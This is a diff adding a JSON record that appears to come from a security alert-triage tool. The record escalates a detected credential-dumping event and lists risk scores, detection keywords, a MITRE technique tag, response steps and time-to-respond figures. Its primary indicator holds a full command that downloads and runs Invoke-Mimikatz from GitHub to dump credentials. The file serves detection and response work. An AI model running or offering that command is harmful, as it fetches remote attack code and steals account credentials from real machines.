@@ -1,0 +1,41 @@
+{
+  "decision": "ESCALATE",
+  "confidence": "HIGH",
+  "host_risk": {
+    "score": 10,
+    "level": "MEDIUM"
+  },
+  "primary_indicator": {
+    "timestamp": "2026-02-02T04:07:21.132496+00:00",
+    "process": "powershell.exe",
+    "command": "\"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+    "score": 19,
+    "reasons": [
+      "high-signal: mimikatz",
+      "high-signal: invoke-mimikatz",
+      "high-signal: dumpcreds",
+      "medium-signal: powershell",
+      "medium-signal: cmd.exe"
+    ],
+    "techniques": [
+      "T1003 \u2013 Credential Dumping"
+    ]
+  },
+  "historical_context": {
+    "count": 0,
+    "first_seen": null,
+    "last_seen": null
+  },
+  "mitre_techniques": [
+    "T1003 \u2013 Credential Dumping"
+  ],
+  "recommended_actions": [
+    "Isolate affected host",
+    "Collect LSASS-related telemetry",
+    "Review recent authentication failures",
+    "Check lateral movement indicators"
+  ],
+  "manual_mttr_minutes": 22.0,
+  "ai_mttr_minutes": 1.5,
+  "mttr_reduction_percent": 93.18
+}
